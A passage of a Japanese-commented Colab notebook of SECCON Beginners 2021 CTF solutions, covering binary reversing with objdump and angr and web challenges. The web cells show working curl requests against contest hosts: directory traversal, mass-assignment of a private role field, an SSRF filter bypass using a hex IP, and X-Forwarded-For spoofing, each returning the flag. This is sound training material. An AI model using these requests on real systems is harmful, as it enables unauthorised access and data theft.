            "    128c:\t3c 6c                \tcmp    al,0x6c\n",
            "    1294:\t3c 64                \tcmp    al,0x64\n",
            "    129c:\t3c 31                \tcmp    al,0x31\n",
            "    12a4:\t3c 6e                \tcmp    al,0x6e\n",
            "    12ac:\t3c 67                \tcmp    al,0x67\n",
            "    12b4:\t3c 7d                \tcmp    al,0x7d\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "x4fu5CD3IU8B"
      },
      "source": [
        "即値を取り出してASCII変換すればflagゲット"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T1DrSLz5A2Y8",
        "outputId": "706821a9-15fb-4514-8f04-17b900f07173"
      },
      "source": [
        "data = !objdump -d -M intel /content/drive/MyDrive/seccon4b2021/only_read/chall | sed '/<main>:/,/^$/!d' | grep cmp\n",
        "\n",
        "hdata = [l.split(\",\")[-1] for l in data]\n",
        "\n",
        "idata = [int(h, 16) for h in hdata]\n",
        "\n",
        "bytearray(idata).decode()\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'ctf4b{c0n5t4nt_f0ld1ng}'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 18
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NUUGyPisdUv0"
      },
      "source": [
        "##be_angry"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "GbEjNThuvny_"
      },
      "source": [
        "angrを使えと言ってるので・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Dx1ZKX5huRXn",
        "outputId": "b6f72737-8a86-4e38-973e-6bb413cf02f6"
      },
      "source": [
        "!pip install angr"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting angr\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/58/f0/8999c7ceadf475f1d90a25b8a83045b8d55ba3b0195363b27abb8482ae69/angr-9.0.7491-py3-none-manylinux1_x86_64.whl (1.5MB)\n",
            "\u001b[K     |████████████████████████████████| 1.5MB 3.9MB/s \n",
            "\u001b[?25hRequirement already satisfied: networkx>=2.0 in /usr/local/lib/python3.7/dist-packages (from angr) (2.5.1)\n",
            "Collecting ailment==9.0.7491\n",
            "  Downloading https://files.pythonhosted.org/packages/ef/f2/026f80fd1d57ff9e7e9983d932f7ec420810abf0c71eda989d8f1c5d10d9/ailment-9.0.7491-py3-none-any.whl\n",
            "Collecting capstone>=3.0.5rc2\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/38/85/647d512c2c2e2981d6f4c70ed41c5ec3d8d6f06cc9c9dd63348e8e6a21a3/capstone-4.0.2-py2.py3-none-manylinux1_x86_64.whl (2.1MB)\n",
            "\u001b[K     |████████████████████████████████| 2.1MB 29.5MB/s \n",
            "\u001b[?25hCollecting claripy==9.0.7491\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/dd/2d/faac22650e9902e1555e44efa51b55eaef389097e4399c478c0ec64426e6/claripy-9.0.7491-py3-none-any.whl (152kB)\n",
            "\u001b[K     |████████████████████████████████| 153kB 43.8MB/s \n",
            "\u001b[?25hCollecting archinfo==9.0.7491\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/b0/71/e82bee2ba4642db9049e81cd30f44bc4a6e15de659dacf128440d8861a35/archinfo-9.0.7491-py3-none-any.whl (56kB)\n",
            "\u001b[K     |████████████████████████████████| 61kB 7.5MB/s \n",
            "\u001b[?25hRequirement already satisfied: sortedcontainers in /usr/local/lib/python3.7/dist-packages (from angr) (2.4.0)\n",
            "Collecting CppHeaderParser\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/3c/ba/d8d168a4b54cae66eaf13d1d9197ca9349c94653815e061f79e7eed86c01/CppHeaderParser-2.7.4.tar.gz (54kB)\n",
            "\u001b[K     |████████████████████████████████| 61kB 8.0MB/s \n",
            "\u001b[?25hCollecting rpyc\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/e8/4c/6d456ae4319190d17e0d4cd8c1ee6b6ba9125f0bde18ef37afdb50867a39/rpyc-5.0.1-py3-none-any.whl (68kB)\n",
            "\u001b[K     |████████████████████████████████| 71kB 8.3MB/s \n",
            "\u001b[?25hRequirement already satisfied: psutil in /usr/local/lib/python3.7/dist-packages (from angr) (5.4.8)\n",
            "Requirement already satisfied: cachetools in /usr/local/lib/python3.7/dist-packages (from angr) (4.2.2)\n",
            "Collecting dpkt\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/97/6b/24d11bc33fc729d770fa1f564d3835b3a183bc3939cde1749d46b39f628f/dpkt-1.9.6-py3-none-any.whl (178kB)\n",
            "\u001b[K     |████████████████████████████████| 184kB 39.5MB/s \n",
            "\u001b[?25hCollecting GitPython\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/27/da/6f6224fdfc47dab57881fe20c0d1bc3122be290198ba0bf26a953a045d92/GitPython-3.1.17-py3-none-any.whl (166kB)\n",
            "\u001b[K     |████████████████████████████████| 174kB 37.5MB/s \n",
            "\u001b[?25hCollecting mulpyplexer\n",
            "  Downloading https://files.pythonhosted.org/packages/d7/6f/f036d4fb9f5a511262345bb18215c70fa69a250aca2e5ffe1a9c7e4cb85c/mulpyplexer-0.09.tar.gz\n",
            "Requirement already satisfied: progressbar2 in /usr/local/lib/python3.7/dist-packages (from angr) (3.38.0)\n",
            "Requirement already satisfied: protobuf>=3.12.0 in /usr/local/lib/python3.7/dist-packages (from angr) (3.12.4)\n",
            "Requirement already satisfied: cffi>=1.14.0 in /usr/local/lib/python3.7/dist-packages (from angr) (1.14.5)\n",
            "Collecting cle==9.0.7491\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/69/45/e486effb75446b2fa57818a1818ea46c3c407a9b78786caef9ac5a097662/cle-9.0.7491-py3-none-any.whl (142kB)\n",
            "\u001b[K     |████████████████████████████████| 143kB 39.4MB/s \n",
            "\u001b[?25hCollecting pyvex==9.0.7491\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/dc/07/fa1476da1fcee7e2a849fd7c1d9b82f4196f35a94d925b4ca1b9742cf25c/pyvex-9.0.7491-py3-none-manylinux1_x86_64.whl (2.9MB)\n",
            "\u001b[K     |████████████████████████████████| 2.9MB 40.4MB/s \n",
            "\u001b[?25hRequirement already satisfied: pycparser>=2.18 in /usr/local/lib/python3.7/dist-packages (from angr) (2.20)\n",
            "Collecting unicorn==1.0.2rc4\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/fa/61/f1acd99cd7180746c4ab4be1bee3793402592435fd9a23783e7f5b7e9d99/unicorn-1.0.2rc4-py2.py3-none-manylinux1_x86_64.whl (8.1MB)\n",
            "\u001b[K     |████████████████████████████████| 8.1MB 45.5MB/s \n",
            "\u001b[?25hCollecting itanium-demangler\n",
            "  Downloading https://files.pythonhosted.org/packages/25/98/bd3496af11643dc9d74dc62ea3f5323b7874a08bd3aeac61927f0c029453/itanium_demangler-1.0.tar.gz\n",
            "Requirement already satisfied: decorator<5,>=4.3 in /usr/local/lib/python3.7/dist-packages (from networkx>=2.0->angr) (4.4.2)\n",
            "Requirement already satisfied: future in /usr/local/lib/python3.7/dist-packages (from claripy==9.0.7491->angr) (0.16.0)\n",
            "Collecting pysmt>=0.9.1.dev119\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/7c/45/4d15acd23edce3a5cee2c3a6359c091261595dce25306a3b848521e34b14/PySMT-0.9.1.dev132-py2.py3-none-any.whl (317kB)\n",
            "\u001b[K     |████████████████████████████████| 327kB 36.9MB/s \n",
            "\u001b[?25hCollecting z3-solver>=4.8.5.0\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/fa/ef/d972d512ac4fb56d7fb4b93dfc4dc16450b68328e359b67edd70c77f8e9b/z3_solver-4.8.10.0-py2.py3-none-manylinux1_x86_64.whl (32.6MB)\n",
            "\u001b[K     |████████████████████████████████| 32.6MB 111kB/s \n",
            "\u001b[?25hCollecting ply\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/a3/58/35da89ee790598a0700ea49b2a66594140f44dec458c07e8e3d4979137fc/ply-3.11-py2.py3-none-any.whl (49kB)\n",
            "\u001b[K     |████████████████████████████████| 51kB 6.7MB/s \n",
            "\u001b[?25hCollecting plumbum\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/6c/fc/6cdaf59a001c707333869b054daf1e0df02978d261f20f8b082afcf189c3/plumbum-1.7.0-py2.py3-none-any.whl (116kB)\n",
            "\u001b[K     |████████████████████████████████| 122kB 52.2MB/s \n",
            "\u001b[?25hCollecting gitdb<5,>=4.0.1\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/ea/e8/f414d1a4f0bbc668ed441f74f44c116d9816833a48bf81d22b697090dba8/gitdb-4.0.7-py3-none-any.whl (63kB)\n",
            "\u001b[K     |████████████████████████████████| 71kB 8.1MB/s \n",
            "\u001b[?25hRequirement already satisfied: typing-extensions>=3.7.4.0; python_version < \"3.8\" in /usr/local/lib/python3.7/dist-packages (from GitPython->angr) (3.7.4.3)\n",
            "Requirement already satisfied: python-utils>=2.3.0 in /usr/local/lib/python3.7/dist-packages (from progressbar2->angr) (2.5.6)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.7/dist-packages (from progressbar2->angr) (1.15.0)\n",
            "Requirement already satisfied: setuptools in /usr/local/lib/python3.7/dist-packages (from protobuf>=3.12.0->angr) (56.1.0)\n",
            "Collecting pyelftools>=0.25\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/6f/50/3d7729d64bb23393aa4c166af250a6e6f9def40c90bf0e9af3c5ad25b6f7/pyelftools-0.27-py2.py3-none-any.whl (151kB)\n",
            "\u001b[K     |████████████████████████████████| 153kB 52.6MB/s \n",
            "\u001b[?25hCollecting pefile\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/dc/8e/99fde2fe50afebbb1ef6f46508203e66e45c6e3966caacd219152c8a52e1/pefile-2021.5.24.tar.gz (66kB)\n",
            "\u001b[K     |████████████████████████████████| 71kB 9.0MB/s \n",
            "\u001b[?25hCollecting bitstring\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/c3/fc/ffac2c199d2efe1ec5111f55efeb78f5f2972456df6939fea849f103f9f5/bitstring-3.1.7.tar.gz (195kB)\n",
            "\u001b[K     |████████████████████████████████| 204kB 50.6MB/s \n",
            "\u001b[?25hCollecting smmap<5,>=3.0.1\n",
            "  Downloading https://files.pythonhosted.org/packages/68/ee/d540eb5e5996eb81c26ceffac6ee49041d473bc5125f2aa995cf51ec1cf1/smmap-4.0.0-py2.py3-none-any.whl\n",
            "Building wheels for collected packages: CppHeaderParser, mulpyplexer, itanium-demangler, pefile, bitstring\n",
            "  Building wheel for CppHeaderParser (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for CppHeaderParser: filename=CppHeaderParser-2.7.4-cp37-none-any.whl size=44973 sha256=96380028585fe795f87d19c5fc18794c4180b3c6f877db648cb9fb7d2b123782\n",
            "  Stored in directory: /root/.cache/pip/wheels/67/fc/2d/f9b9e6c40d59e5db861c24ba5af2e8a9f92720ea584fd4ca1d\n",
            "  Building wheel for mulpyplexer (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for mulpyplexer: filename=mulpyplexer-0.9-cp37-none-any.whl size=3789 sha256=7d58a46293f4a047eb1622decf35a272b4931e6c49cf459a9e787317ce14004f\n",
            "  Stored in directory: /root/.cache/pip/wheels/cf/05/dd/95eddbe975b0bb615afecd907b33b49a7e66959f127c85c537\n",
            "  Building wheel for itanium-demangler (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for itanium-demangler: filename=itanium_demangler-1.0-cp37-none-any.whl size=7290 sha256=3ee3aa85a6226628c4a0fd75a0e788ecf3d156f8c7cd40fa63d9b3f4e2d5c810\n",
            "  Stored in directory: /root/.cache/pip/wheels/64/60/d5/92a97a13ab126a78b1d25ad01bd1a9909926c4b52c4a0581af\n",
            "  Building wheel for pefile (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pefile: filename=pefile-2021.5.24-cp37-none-any.whl size=62579 sha256=916c008324491d99556ef0cf207a0adedffdb4fb49f453b415059f415c822782\n",
            "  Stored in directory: /root/.cache/pip/wheels/d6/7d/79/6d4efc404f6bd245244465f13a73bb7d303f83d70beb67b071\n",
            "  Building wheel for bitstring (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for bitstring: filename=bitstring-3.1.7-cp37-none-any.whl size=37949 sha256=066d084f3ca1a65703334e27981b83ae321aae67a4983e57baf31c48855fa009\n",
            "  Stored in directory: /root/.cache/pip/wheels/b8/27/f0/8373e26b7de57db03dc18aaaebdd8c26a99da882416f762979\n",
            "Successfully built CppHeaderParser mulpyplexer itanium-demangler pefile bitstring\n",
            "Installing collected packages: ailment, capstone, pysmt, z3-solver, claripy, archinfo, ply, CppHeaderParser, plumbum, rpyc, dpkt, smmap, gitdb, GitPython, mulpyplexer, pyelftools, pefile, bitstring, pyvex, cle, unicorn, itanium-demangler, angr\n",
            "Successfully installed CppHeaderParser-2.7.4 GitPython-3.1.17 ailment-9.0.7491 angr-9.0.7491 archinfo-9.0.7491 bitstring-3.1.7 capstone-4.0.2 claripy-9.0.7491 cle-9.0.7491 dpkt-1.9.6 gitdb-4.0.7 itanium-demangler-1.0 mulpyplexer-0.9 pefile-2021.5.24 plumbum-1.7.0 ply-3.11 pyelftools-0.27 pysmt-0.9.1.dev132 pyvex-9.0.7491 rpyc-5.0.1 smmap-4.0.0 unicorn-1.0.2rc4 z3-solver-4.8.10.0\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LQ8eG1d6ZgXA",
        "outputId": "029e1589-124c-4658-a2f3-758a19a25246"
      },
      "source": [
        "import angr"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.7/dist-packages/Cython/Compiler/Main.py:369: FutureWarning: Cython directive 'language_level' not set, using 2 for now (Py2). This will change in a later release! File: /usr/local/lib/python3.7/dist-packages/pysmt/smtlib/parser/parser.py\n",
            "  tree = Parsing.p_module(s, pxd, full_module_name)\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gPbpqHD1waTK"
      },
      "source": [
        "<a href=\"https://ox0xo.github.io/ctf/angrbeginner\">ここいら</a>を参考にコーディング"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "1seh7nUNZrf-",
        "outputId": "80b2245a-14be-456b-8add-bcf90ce95c59"
      },
      "source": [
        "p = angr.Project(\"/content/drive/MyDrive/seccon4b2021/chall\")\n",
        "\n",
        "state = p.factory.entry_state()\n",
        "sim = p.factory.simulation_manager(state)\n",
        "sim.explore(find=(0x400000+0x2532,), avoid=(0x400000+0x202a,))\n",
        "\n",
        "print(sim.found[0].posix.dumps(0))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "WARNING | 2021-05-27 06:03:19,562 | \u001b[36mcle.loader\u001b[0m | \u001b[36mThe main binary is a position-independent executable. It is being loaded with a base address of 0x400000.\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,056 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32mThe program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,058 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32mangr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,061 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32m1) setting a value to the initial state\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,063 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32m2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,065 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32m3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,067 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32mFilling register id with 8 unconstrained bytes referenced from 0x4028f9 (_1_main_flag_func_4+0x1f in chall (0x28f9))\u001b[0m\n",
            "WARNING | 2021-05-27 06:03:21,071 | \u001b[32mangr.storage.memory_mixins.default_filler_mixin\u001b[0m | \u001b[32mFilling register ac with 8 unconstrained bytes referenced from 0x4028f9 (_1_main_flag_func_4+0x1f in chall (0x28f9))\u001b[0m\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "b'ctf4b{3nc0d3_4r1thm3t1c}'\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "RZFclQ3xt5aQ"
      },
      "source": [
        "#web"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "H0sQFZzDEE3r"
      },
      "source": [
        "##osoba"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bcF9aaoqERuq"
      },
      "source": [
        "ディレクトリトラバーサルして探す"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CVc6Ko80EH3Z",
        "outputId": "109780c1-3da6-4b5b-b8dd-4fe63de1385a"
      },
      "source": [
        "!curl https://osoba.quals.beginners.seccon.jp/?page=public/../../flag"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "ctf4b{omisoshiru_oishi_keredomo_tsukuruno_taihen}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aEngx1Y3DeTf"
      },
      "source": [
        "##Werewolf"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hrheAX0JEiqW"
      },
      "source": [
        "Playerクラスの_role変数に\"WEREWOLF\"を設定すればいい\n",
        "\n",
        "POSTしたパラメタを全て読み込む仕様なので、あとは変数の指定方法だけ"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hohcS715uP3a",
        "outputId": "8bc2b451-881b-4d97-d9e7-74d67a41b484"
      },
      "source": [
        "!curl -d \"name=aaa&color=red&_Player__role=WEREWOLF\" https://werewolf.quals.beginners.seccon.jp/"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<!DOCTYPE html>\n",
            "<html>\n",
            "\n",
            "<head>\n",
            "  <meta charset=\"utf-8\">\n",
            "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n",
            "  <title>Werewolf</title>\n",
            "  <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.2/css/bulma.min.css\">\n",
            "  <script defer src=\"https://use.fontawesome.com/releases/v5.3.1/js/all.js\"></script>\n",
            "</head>\n",
            "\n",
            "<body>\n",
            "  <section class=\"hero is-dark\">\n",
            "    <div class=\"hero-body\">\n",
            "      <div class=\"container\">\n",
            "        <h1 class=\"title\">\n",
            "          Werewolf\n",
            "        </h1>\n",
            "      </div>\n",
            "    </div>\n",
            "  </section>\n",
            "\n",
            "  <section class=\"section\">\n",
            "    <div class=\"container\">\n",
            "      <div class=\"columns is-centered\">\n",
            "        <div class=\"column is-half\">\n",
            "          <h1 class=\"title\">\n",
            "            aaa, you are \n",
            "            <span style=\"color: red\">\n",
            "              WEREWOLF\n",
            "            </span>\n",
            "            .\n",
            "          </h1>\n",
            "          \n",
            "            <p id=\"flag\">ctf4b{there_are_so_many_hackers_among_us}</p>\n",
            "          \n",
            "          <img src=\"static/WEREWOLF.png\" style=\"width: 40%\" />\n",
            "        </div>\n",
            "      </div>\n",
            "    </div>\n",
            "  </section>\n",
            "</body>"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LLbHHuI4xLRF"
      },
      "source": [
        "##checkurl"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zzN2uK13FOov"
      },
      "source": [
        "GETパラメタに\"127.0.0.1\"が指定できればflagゲット。ただし、「.（コロン）」は全ておばけに置換される。\n",
        "\n",
        "<a href=\"https://qiita.com/naka_kyon/items/88478be20b300e757fc0\">ここ</a>によると、URIでIPアドレスを指定する時に様々な表記方法が可能らしい。（ブラウザ依存）"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MbEMZTsTxOg2",
        "outputId": "6b3ac5c7-ac08-4a01-b811-bdc1e40c0bf6"
      },
      "source": [
        "!curl -k https://check-url.quals.beginners.seccon.jp/?url=https://0x7F000001/"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<!DOCTYPE html>\n",
            "<html>\n",
            "<head>\n",
            "  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n",
            "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1.0\"/>\n",
            "  <title>c(heck)_url</title>\n",
            "\n",
            "  <!-- CSS  -->\n",
            "  <link href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" rel=\"stylesheet\">\n",
            "  <link href=\"css/materialize.min.css\" type=\"text/css\" rel=\"stylesheet\" media=\"screen,projection\"/>\n",
            "  <link href=\"css/style.css\" type=\"text/css\" rel=\"stylesheet\" media=\"screen,projection\"/>\n",
            "</head>\n",
            "<body>\n",
            "\n",
            "  <nav class=\"light-blue lighten-1\" role=\"navigation\">\n",
            "    <div class=\"nav-wrapper container\">\n",
            "      <a id=\"logo-container\" href=\"/\" class=\"brand-logo\">c(heck)_url</a>\n",
            "    </div>\n",
            "  </nav>\n",
            "\n",
            "  <div class=\"section no-pad-bot\" id=\"index-banner\">\n",
            "    <div class=\"container\">\n",
            "      <br><br>\n",
            "      <h1 class=\"header center orange-text\">c(heck)_url</h1>\n",
            "      <div class=\"row center\">\n",
            "        <h5 class=\"header col s12 light\">\n",
            "        You can run <b>curl</b> <a href=\"/?url=https://www.example.com\">like this</a>!<br><br>\n",
            "          Here, take this<br>URL: https://0x7F000001/<br><iframe srcdoc='<!DOCTYPE html>\n",
            "<html>\n",
            "<head>\n",
            "  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n",
            "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1.0\"/>\n",
            "  <title>c(heck)_url</title>\n",
            "\n",
            "  <!-- CSS  -->\n",
            "  <link href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" rel=\"stylesheet\">\n",
            "  <link href=\"css/materialize.min.css\" type=\"text/css\" rel=\"stylesheet\" media=\"screen,projection\"/>\n",
            "  <link href=\"css/style.css\" type=\"text/css\" rel=\"stylesheet\" media=\"screen,projection\"/>\n",
            "</head>\n",
            "<body>\n",
            "\n",
            "  <nav class=\"light-blue lighten-1\" role=\"navigation\">\n",
            "    <div class=\"nav-wrapper container\">\n",
            "      <a id=\"logo-container\" href=\"/\" class=\"brand-logo\">c(heck)_url</a>\n",
            "    </div>\n",
            "  </nav>\n",
            "\n",
            "  <div class=\"section no-pad-bot\" id=\"index-banner\">\n",
            "    <div class=\"container\">\n",
            "      <br><br>\n",
            "      <h1 class=\"header center orange-text\">c(heck)_url</h1>\n",
            "      <div class=\"row center\">\n",
            "        <h5 class=\"header col s12 light\">\n",
            "        You can run <b>curl</b> <a href=\"/?url=https://www.example.com\">like this</a>!<br><br>\n",
            "          Hi, Admin or SSSSRFer<br>ctf4b{5555rf_15_53rv3r_51d3_5up3r_54n171z3d_r3qu357_f0r63ry}        </h5>\n",
            "      </div>\n",
            "\n",
            "    </div>\n",
            "  </div>\n",
            "\n",
            "\n",
            "  <!--  Scripts-->\n",
            "  <script src=\"https://code.jquery.com/jquery-2.1.1.min.js\"></script>\n",
            "  <script src=\"js/materialize.min.js\"></script>\n",
            "  <script src=\"js/init.js\"></script>\n",
            "\n",
            "  </body>\n",
            "</html>\n",
            "' width='750' height='500'></iframe>        </h5>\n",
            "      </div>\n",
            "\n",
            "    </div>\n",
            "  </div>\n",
            "\n",
            "\n",
            "  <!--  Scripts-->\n",
            "  <script src=\"https://code.jquery.com/jquery-2.1.1.min.js\"></script>\n",
            "  <script src=\"js/materialize.min.js\"></script>\n",
            "  <script src=\"js/init.js\"></script>\n",
            "\n",
            "  </body>\n",
            "</html>\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "L71PV_97RjMO"
      },
      "source": [
        "##json"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "OI6oi8qQG81A"
      },
      "source": [
        "アクセス元アドレスを詐称できればいい。\n",
        "\n",
        "「X-Forwarded-For:」ヘッダーを使うらしい。<a href=\"https://www.m3tech.blog/entry/x-forwarded-for\">この辺</a>が参考になる。\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QRgPCuyLRiRb",
        "outputId": "5f1a52d1-727a-4b4f-b87f-79f3e7808664"
      },
      "source": [
        "!curl -H \"X-Forwarded-For:192.168.111.10\" https://json.quals.beginners.seccon.jp/"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<!DOCTYPE html>\n",
            "<html>\n",
            "  <head>\n",
            "    <meta charset=\"utf-8\" />\n",
            "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n",
            "    <title>Internal Website / 内部ページ</title>\n",
            "    <link\n",
            "      rel=\"stylesheet\"\n",
            "      href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css\"\n",
            "    />\n",
            "  </head>\n",
            "\n",
            "  <body>\n",
            "    <section class=\"section\">\n",
            "      <div class=\"container\">\n",
            "        <h1 class=\"title\">Internal Website / 内部ページ</h1>\n",
            "        <p class=\"subtitle mt-1\">\n",
            "          You can get special information in this page.\n",
            "        </p>\n",
            "        <div class=\"field\">\n",
            "          <label class=\"label\">Select item</label>\n",
            "          <div class=\"control\">\n",
            "            <div class=\"select\">\n",
            "              <select id=\"item\">\n",
            "                <option>Quick brown fox</option>\n",
            "                <option>Lorem ipsum</option>\n",
            "                <option>Flag</option>\n",
            "              </select>\n",
            "            </div>\n",
            "          </div>\n",
            "        </div>\n",
            "        <div class=\"field is-grouped\">\n",
            "          <div class=\"control\">\n",
            "            <button id=\"submit\" class=\"button is-link\">Submit</button>\n",
            "          </div>\n",
            "        </div>\n",
            "        <div id=\"message\"></div>\n",
            "      </div>\n",
            "    </section>\n",
            "    <script>\n",
            "      let submit = document.getElementById(\"submit\");\n",
            "      let message = document.getElementById(\"message\");\n",
            "      submit.addEventListener(\"click\", (event) => {\n",
            "        message.innerHTML = \"\";\n",
            "        let xhr = new XMLHttpRequest();\n",
            "        xhr.open(\"POST\", \"/\");\n",
            "        xhr.setRequestHeader(\"Content-Type\", \"application/json\");\n",
            "        xhr.onload = () => {\n",
            "          if (xhr.status === 200) {\n",
            "            message.innerHTML =\n",
            "              '<article class=\"message is-success\"><div class=\"message-header\"><p>Success</p></div><div class=\"message-body\">' +\n",
            "              JSON.parse(xhr.response).result +\n",
            "              \"</div></article>\";\n",
            "          } else {\n",
            "            message.innerHTML =\n",
            "              '<article class=\"message is-danger\"><div class=\"message-header\"><p>Error</p></div><div class=\"message-body\">' +\n",
            "              JSON.parse(xhr.response).error +\n",
            "              \"</div></article>\";\n",
            "          }\n",
            "        };\n",
            "        data = JSON.stringify({\n",
            "          id: document.getElementById(\"item\").selectedIndex,\n",
            "        });\n",
            "        xhr.send(data);\n",
            "      });\n",
            "    </script>\n",
            "  </body>\n",
            "</html>\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "osAFa1k7SI9n"
      },
      "source": [
        "上のソースを読むと当然次のようにだろうと思われ・・・"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "tCV4_quaR3nL",
        "outputId": "149f6479-8b71-4253-923a-aab514f3974a"
      },
      "source": [
        "!curl -H \"X-Forwarded-For:192.168.111.10\" -H \"Content-Type:application/json\"  -d '{\"id\":2}' https://json.quals.beginners.seccon.jp/"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"error\":\"It is forbidden to retrieve Flag from this BFF server.\"}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Kphu0N5MSelF"
      },
      "source": [
        "重複設定されたjsonデータをparserが解釈する際の差異を利用するという・・・難しい"
      ]
    },
